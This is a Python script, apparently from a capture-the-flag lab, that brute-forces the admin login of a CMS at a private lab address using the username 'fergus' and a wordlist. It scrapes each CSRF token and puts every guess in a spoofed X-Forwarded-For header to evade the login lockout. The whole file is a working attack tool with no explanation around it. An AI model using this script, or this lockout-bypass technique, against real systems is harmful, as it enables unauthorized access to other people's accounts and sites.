#!/usr/bin/env python3
import requests
import re

def read_file(filename):
    wordlist = []
    with open (filename) as f:
        for line in f:
            wordlist.append(line.strip())
    wordlist.append('adminadmin')
    return wordlist
     
def main():
    host = 'http://10.10.10.191'
    login_url = host+'/admin/login.php'
    username = 'fergus'
    wordlist = read_file('password.txt')
    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
        print(f"[*]Trying password {password}")
        headers = {
    	'X-Forwarded-For': password,
    	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
    	'Referer': login_url
        }
        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }
        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                break


if __name__ == "__main__":
    main()